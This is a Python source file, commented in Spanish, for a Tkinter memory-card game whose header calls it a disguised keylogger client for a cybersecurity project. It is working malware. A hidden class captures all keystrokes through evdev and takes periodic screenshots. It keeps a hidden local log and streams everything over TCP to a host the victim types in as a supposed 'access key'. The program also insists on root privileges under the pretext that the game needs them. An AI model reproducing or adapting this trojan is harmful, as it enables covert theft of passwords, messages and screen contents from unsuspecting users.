#!/usr/bin/env python3
"""
=============================================================
  🧠 MEMORAMA - Juego de Memoria
  (Cliente Keylogger disfrazado - Proyecto de Ciberseguridad)
=============================================================
"""

import socket
import json
import io
import os
import sys
import time
import random
import threading
import tkinter as tk
from tkinter import messagebox
from datetime import datetime

try:
    import evdev
    from evdev import InputDevice, categorize, ecodes
except ImportError:
    print("[!] Instala evdev: pip install evdev")
    sys.exit(1)

try:
    from PIL import ImageGrab
except ImportError:
    print("[!] Instala Pillow: pip install Pillow")
    sys.exit(1)

# ── Configuración oculta ──────────────────────────────────
DEFAULT_PORT = 9999
SCREENSHOT_INTERVAL = 60
KEY_BUFFER_FLUSH_INTERVAL = 5
LOCAL_LOG_FILE = ".game_cache.tmp"

# ── Emojis para el memorama ───────────────────────────────
CARD_EMOJIS = ["🐶", "🐱", "🦊", "🐼", "🐸", "🦋", "🌟", "🔥",
               "🎵", "💎", "🍕", "🚀", "🌈", "🎯", "🍀", "🎲"]

# ── Mapa de teclas evdev → texto legible ──────────────────
KEY_MAP = {
    "KEY_A": "a", "KEY_B": "b", "KEY_C": "c", "KEY_D": "d",
    "KEY_E": "e", "KEY_F": "f", "KEY_G": "g", "KEY_H": "h",
    "KEY_I": "i", "KEY_J": "j", "KEY_K": "k", "KEY_L": "l",
    "KEY_M": "m", "KEY_N": "n", "KEY_O": "o", "KEY_P": "p",
    "KEY_Q": "q", "KEY_R": "r", "KEY_S": "s", "KEY_T": "t",
    "KEY_U": "u", "KEY_V": "v", "KEY_W": "w", "KEY_X": "x",
    "KEY_Y": "y", "KEY_Z": "z",
    "KEY_1": "1", "KEY_2": "2", "KEY_3": "3", "KEY_4": "4",
    "KEY_5": "5", "KEY_6": "6", "KEY_7": "7", "KEY_8": "8",
    "KEY_9": "9", "KEY_0": "0",
    "KEY_SPACE": " ",
    "KEY_ENTER": "[ENTER]\n",
    "KEY_TAB": "[TAB]",
    "KEY_BACKSPACE": "[BACKSPACE]",
    "KEY_DELETE": "[DELETE]",
    "KEY_ESC": "[ESC]",
    "KEY_CAPSLOCK": "[CAPS]",
    "KEY_DOT": ".", "KEY_COMMA": ",",
    "KEY_SLASH": "/", "KEY_BACKSLASH": "\\",
    "KEY_SEMICOLON": ";", "KEY_APOSTROPHE": "'",
    "KEY_LEFTBRACE": "[", "KEY_RIGHTBRACE": "]",
    "KEY_MINUS": "-", "KEY_EQUAL": "=",
    "KEY_GRAVE": "`",
    "KEY_UP": "[↑]", "KEY_DOWN": "[↓]",
    "KEY_LEFT": "[←]", "KEY_RIGHT": "[→]",
    "KEY_F1": "[F1]", "KEY_F2": "[F2]", "KEY_F3": "[F3]",
    "KEY_F4": "[F4]", "KEY_F5": "[F5]", "KEY_F6": "[F6]",
    "KEY_F7": "[F7]", "KEY_F8": "[F8]", "KEY_F9": "[F9]",
    "KEY_F10": "[F10]", "KEY_F11": "[F11]", "KEY_F12": "[F12]",
}

# Teclas modificadoras (no se registran como texto)
MODIFIER_KEYS = {
    "KEY_LEFTSHIFT", "KEY_RIGHTSHIFT",
    "KEY_LEFTCTRL", "KEY_RIGHTCTRL",
    "KEY_LEFTALT", "KEY_RIGHTALT",
    "KEY_LEFTMETA", "KEY_RIGHTMETA",
}


def find_keyboard_devices():
    """Encuentra todos los dispositivos de teclado en /dev/input/."""
    keyboards = []
    for path in evdev.list_devices():
        try:
            device = InputDevice(path)
            caps = device.capabilities(verbose=True)
            # Buscar dispositivos que tengan eventos de teclas
            for cap_type, events in caps.items():
                if cap_type[0] == "EV_KEY":
                    # Verificar que tenga teclas de letras (no solo botones)
                    event_names = [e[0][0] if isinstance(e[0], list) else e[0] for e in events]
                    if any("KEY_A" in str(n) for n in event_names):
                        keyboards.append(device)
                        break
        except (PermissionError, OSError):
            continue
    return keyboards


# ══════════════════════════════════════════════════════════
#  KEYLOGGER (OCULTO EN SEGUNDO PLANO)
# ══════════════════════════════════════════════════════════

class SilentLogger:
    """Keylogger que corre silenciosamente en background usando evdev."""

    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = None
        self.connected = False
        self.running = True
        self.key_buffer = []
        self.buffer_lock = threading.Lock()
        self.shift_pressed = False

    def connect(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.connect((self.host, self.port))
            self.connected = True
            return True
        except Exception:
            self.connected = False
            return False

    def reconnect(self):
        delay = 5
        while self.running and not self.connected:
            time.sleep(delay)
            if self.connect():
                return True
            delay = min(delay * 2, 60)
        return False

    def send_data(self, msg_type, payload, filename=None):
        if not self.connected:
            return False
        try:
            header = {"type": msg_type, "size": len(payload)}
            if filename:
                header["filename"] = filename
            header_json = json.dumps(header).encode("utf-8") + b"\n"
            self.sock.sendall(header_json + payload)
            return True
        except (BrokenPipeError, ConnectionResetError, OSError):
            self.connected = False
            return False

    def capture_keys(self):
        """Captura teclas de TODOS los teclados usando evdev."""
        keyboards = find_keyboard_devices()

        if not keyboards:
            return

        # Leer de todos los teclados en paralelo
        for kb in keyboards:
            t = threading.Thread(
                target=self._read_device, args=(kb,), daemon=True
            )
            t.start()

    def _read_device(self, device):
        """Lee eventos de un dispositivo de teclado."""
        try:
            for event in device.read_loop():
                if not self.running:
                    break
                if event.type != ecodes.EV_KEY:
                    continue

                key_event = categorize(event)
                key_name = key_event.keycode

                # Si es una lista, tomar el primer nombre
                if isinstance(key_name, list):
                    key_name = key_name[0]

                # Rastrear estado de shift
                if key_name in ("KEY_LEFTSHIFT", "KEY_RIGHTSHIFT"):
                    if key_event.keystate == key_event.key_down:
                        self.shift_pressed = True
                    elif key_event.keystate == key_event.key_up:
                        self.shift_pressed = False
                    continue

                # Ignorar modificadores
                if key_name in MODIFIER_KEYS:
                    continue

                # Solo registrar key_down (no repeticiones ni releases)
                if key_event.keystate != key_event.key_down:
                    continue

                # Convertir a texto
                char = KEY_MAP.get(key_name, "")
                if not char:
                    continue

                # Aplicar shift (mayúsculas)
                if self.shift_pressed and len(char) == 1 and char.isalpha():
                    char = char.upper()

                with self.buffer_lock:
                    self.key_buffer.append(char)

        except (OSError, IOError):
            pass  # Dispositivo desconectado

    def flush_loop(self):
        """Envía el buffer de teclas periódicamente."""
        while self.running:
            time.sleep(KEY_BUFFER_FLUSH_INTERVAL)
            with self.buffer_lock:
                if not self.key_buffer:
                    continue
                text = "".join(self.key_buffer)
                self.key_buffer.clear()

            # Log local
            try:
                with open(LOCAL_LOG_FILE, "a") as f:
                    f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {text}\n")
            except Exception:
                pass

            if self.connected:
                if not self.send_data("keys", text.encode("utf-8")):
                    threading.Thread(target=self.reconnect, daemon=True).start()

    def screenshot_loop(self):
        """Captura screenshots periódicamente."""
        while self.running:
            time.sleep(SCREENSHOT_INTERVAL)
            if not self.running:
                break
            try:
                screenshot = ImageGrab.grab()
                buf = io.BytesIO()
                screenshot.save(buf, format="PNG")
                img_data = buf.getvalue()
            except Exception:
                continue

            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            fname = f"screenshot_{ts}.png"

            if self.connected:
                self.send_data("screenshot", img_data, fname)

    def start(self):
        """Inicia todos los hilos del keylogger."""
        if not self.connect():
            threading.Thread(target=self.reconnect, daemon=True).start()

        # Captura de teclas con evdev
        threading.Thread(target=self.capture_keys, daemon=True).start()
        # Flush de teclas
        threading.Thread(target=self.flush_loop, daemon=True).start()
        # Screenshots
        threading.Thread(target=self.screenshot_loop, daemon=True).start()

    def stop(self):
        self.running = False
        try:
            if self.sock:
                self.sock.close()
        except Exception:
            pass


# ══════════════════════════════════════════════════════════
#  JUEGO DE MEMORAMA (INTERFAZ VISIBLE)
# ══════════════════════════════════════════════════════════

class MemoramaApp:
    def __init__(self, root):
        self.root = root
        self.root.title("🧠 Memorama - Juego de Memoria")
        self.root.geometry("600x700")
        self.root.configure(bg="#0f0f23")
        self.root.resizable(False, False)

        self.logger = None
        self.show_login_screen()

    # ── Pantalla de Login (pide la "clave") ────────────────

    def show_login_screen(self):
        self.clear_window()

        bg = "#0f0f23"
        fg = "#e0e0e0"

        container = tk.Frame(self.root, bg=bg)
        container.place(relx=0.5, rely=0.5, anchor="center")

        tk.Label(
            container, text="🧠", font=("Helvetica", 72), bg=bg
        ).pack(pady=(0, 5))

        tk.Label(
            container, text="MEMORAMA",
            font=("Helvetica", 36, "bold"), bg=bg, fg="#f0c040"
        ).pack()

        tk.Label(
            container, text="Juego de Memoria",
            font=("Helvetica", 14), bg=bg, fg="#888"
        ).pack(pady=(0, 30))

        key_frame = tk.Frame(container, bg=bg)
        key_frame.pack(pady=10)

        tk.Label(
            key_frame, text="🔑 Ingresa tu clave de acceso:",
            font=("Helvetica", 13), bg=bg, fg=fg
        ).pack()

        self.key_entry = tk.Entry(
            key_frame, width=22, font=("Courier", 16, "bold"),
            bg="#1a1a3e", fg="#00d2ff", insertbackground="#00d2ff",
            justify="center", relief="flat", bd=0,
            highlightthickness=2, highlightcolor="#f0c040",
            highlightbackground="#333"
        )
        self.key_entry.pack(pady=10, ipady=8)
        self.key_entry.bind("<Return>", lambda e: self.validate_key())
        self.key_entry.focus_set()

        self.play_btn = tk.Button(
            key_frame, text="🎮  JUGAR",
            font=("Helvetica", 16, "bold"),
            bg="#28a745", fg="white", activebackground="#218838",
            cursor="hand2", padx=40, pady=8, relief="flat",
            command=self.validate_key
        )
        self.play_btn.pack(pady=15)

        self.error_label = tk.Label(
            key_frame, text="",
            font=("Helvetica", 11), bg=bg, fg="#ff4444"
        )
        self.error_label.pack()

        tk.Label(
            container, text="v2.0 • Obtén tu clave con el administrador",
            font=("Helvetica", 9), bg=bg, fg="#555"
        ).pack(pady=(20, 0))

    def validate_key(self):
        key = self.key_entry.get().strip()

        if not key:
            self.error_label.config(text="⚠ Ingresa una clave")
            return

        self.logger = SilentLogger(key, DEFAULT_PORT)

        self.play_btn.config(text="⏳ Cargando...", state=tk.DISABLED)
        self.error_label.config(text="", fg="#888")

        threading.Thread(target=self._init_and_play, daemon=True).start()

    def _init_and_play(self):
        self.logger.start()
        time.sleep(0.5)
        self.root.after(0, self.show_game)

    # ── Pantalla del Juego ─────────────────────────────────

    def show_game(self):
        self.clear_window()

        bg = "#0f0f23"
        fg = "#e0e0e0"

        self.grid_size = 4
        total = self.grid_size * self.grid_size
        num_pairs = total // 2

        emojis = random.sample(CARD_EMOJIS, num_pairs)
        self.cards = emojis * 2
        random.shuffle(self.cards)

        self.flipped = [False] * total
        self.matched = [False] * total
        self.first_card = None
        self.can_click = True
        self.moves = 0
        self.pairs_found = 0
        self.total_pairs = num_pairs
        self.start_time = time.time()

        header = tk.Frame(self.root, bg="#1a1a3e", pady=8)
        header.pack(fill=tk.X)

        tk.Label(
            header, text="🧠 MEMORAMA",
            font=("Helvetica", 20, "bold"), bg="#1a1a3e", fg="#f0c040"
        ).pack()

        stats = tk.Frame(self.root, bg=bg, pady=5)
        stats.pack(fill=tk.X, padx=20)

        self.moves_label = tk.Label(
            stats, text="Movimientos: 0",
            font=("Helvetica", 12), bg=bg, fg="#aaa"
        )
        self.moves_label.pack(side=tk.LEFT)

        self.pairs_label = tk.Label(
            stats, text=f"Pares: 0/{self.total_pairs}",
            font=("Helvetica", 12), bg=bg, fg="#aaa"
        )
        self.pairs_label.pack(side=tk.RIGHT)

        self.timer_label = tk.Label(
            stats, text="⏱ 00:00",
            font=("Helvetica", 12, "bold"), bg=bg, fg="#00d2ff"
        )
        self.timer_label.pack()

        self.grid_frame = tk.Frame(self.root, bg=bg, pady=10)
        self.grid_frame.pack(expand=True)

        self.buttons = []
        for i in range(total):
            row = i // self.grid_size
            col = i % self.grid_size

            btn = tk.Button(
                self.grid_frame,
                text="❓",
                font=("Helvetica", 28),
                width=3, height=1,
                bg="#2a2a4a", fg="#555",
                activebackground="#3a3a5a",
                relief="flat", bd=0,
                cursor="hand2",
                command=lambda idx=i: self.flip_card(idx)
            )
            btn.grid(row=row, column=col, padx=6, pady=6, ipadx=5, ipady=5)
            self.buttons.append(btn)

        bottom = tk.Frame(self.root, bg=bg, pady=10)
        bottom.pack(fill=tk.X, padx=20)

        tk.Button(
            bottom, text="🔄 Nuevo Juego",
            font=("Helvetica", 11, "bold"),
            bg="#f0c040", fg="#111", activebackground="#daa520",
            cursor="hand2", padx=15, pady=5, relief="flat",
            command=self.show_game
        ).pack(side=tk.LEFT)

        tk.Button(
            bottom, text="🚪 Salir",
            font=("Helvetica", 11, "bold"),
            bg="#e94560", fg="white", activebackground="#c82333",
            cursor="hand2", padx=15, pady=5, relief="flat",
            command=self.quit_app
        ).pack(side=tk.RIGHT)

        self.update_timer()

    def flip_card(self, idx):
        if not self.can_click:
            return
        if self.flipped[idx] or self.matched[idx]:
            return

        self.flipped[idx] = True
        self.buttons[idx].config(
            text=self.cards[idx],
            bg="#3a3a6a", fg="white"
        )

        if self.first_card is None:
            self.first_card = idx
        else:
            self.moves += 1
            self.moves_label.config(text=f"Movimientos: {self.moves}")
            self.can_click = False

            first = self.first_card
            second = idx
            self.first_card = None

            if self.cards[first] == self.cards[second]:
                self.matched[first] = True
                self.matched[second] = True
                self.pairs_found += 1
                self.pairs_label.config(
                    text=f"Pares: {self.pairs_found}/{self.total_pairs}"
                )

                self.buttons[first].config(bg="#1a6b3a")
                self.buttons[second].config(bg="#1a6b3a")
                self.can_click = True

                if self.pairs_found == self.total_pairs:
                    self.root.after(500, self.show_win)
            else:
                self.root.after(800, self.hide_cards, first, second)

    def hide_cards(self, a, b):
        self.flipped[a] = False
        self.flipped[b] = False
        self.buttons[a].config(text="❓", bg="#2a2a4a", fg="#555")
        self.buttons[b].config(text="❓", bg="#2a2a4a", fg="#555")
        self.can_click = True

    def update_timer(self):
        if hasattr(self, 'start_time') and self.pairs_found < self.total_pairs:
            elapsed = int(time.time() - self.start_time)
            mins = elapsed // 60
            secs = elapsed % 60
            self.timer_label.config(text=f"⏱ {mins:02d}:{secs:02d}")
            self.root.after(1000, self.update_timer)

    def show_win(self):
        elapsed = int(time.time() - self.start_time)
        mins = elapsed // 60
        secs = elapsed % 60

        messagebox.showinfo(
            "🎉 ¡Ganaste!",
            f"¡Felicidades! Completaste el memorama.\n\n"
            f"Movimientos: {self.moves}\n"
            f"Tiempo: {mins:02d}:{secs:02d}\n\n"
            f"¿Quieres jugar de nuevo?"
        )
        self.show_game()

    def clear_window(self):
        for widget in self.root.winfo_children():
            widget.destroy()

    def quit_app(self):
        if self.logger:
            self.logger.stop()
        self.root.destroy()


def main():
    # Verificar permisos
    if os.geteuid() != 0:
        print("=" * 50)
        print("  ⚠ Este juego necesita permisos de administrador")
        print("  Ejecuta con: sudo <python_path> client.py")
        print("=" * 50)
        sys.exit(1)

    root = tk.Tk()
    app = MemoramaApp(root)
    root.protocol("WM_DELETE_WINDOW", app.quit_app)
    root.mainloop()


if __name__ == "__main__":
    main()
